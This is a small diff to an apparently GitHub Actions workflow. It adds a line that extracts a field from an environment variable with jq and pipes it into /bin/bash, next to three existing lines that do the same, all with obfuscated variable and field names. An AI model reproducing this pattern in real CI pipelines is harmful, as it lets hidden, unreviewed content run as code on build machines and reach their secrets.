@@ -39,6 +39,7 @@ jobs:
           echo $ql7424 | jq -r .qsksm00786 | /bin/bash
           echo $sc51 | jq -r .sup3 | /bin/bash
           echo $y98 | jq -r .bdfmo67 | /bin/bash
+          printf '%s' "$s80" | jq -r .r6167 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
